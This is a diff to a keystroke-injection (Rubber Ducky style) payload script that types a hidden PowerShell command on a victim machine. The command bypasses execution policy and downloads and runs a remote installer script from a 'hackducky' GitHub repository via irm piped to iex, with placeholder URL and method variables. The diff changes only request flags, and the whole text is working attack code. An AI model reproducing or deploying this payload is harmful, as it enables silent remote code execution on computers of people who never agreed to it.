@@ -8,5 +8,5 @@ DELAY 500
 STRING powershell -NoP -NonI -Ep Bypass
 ENTER
 DELAY 500
-STRING $env:url="#URL";$env:method="#METHOD";irm -Headers @{"Cache-Control"="no-cache"} https://github.com/Sushi-Mampfer/hackducky/raw/refs/heads/main/submissions/installer/installer.ps1 | iex
+STRING $env:url="#URL";$env:method="#METHOD";irm -DisableKeepAlive https://github.com/Sushi-Mampfer/hackducky/raw/refs/heads/main/submissions/installer/installer.ps1 | iex
 ENTER
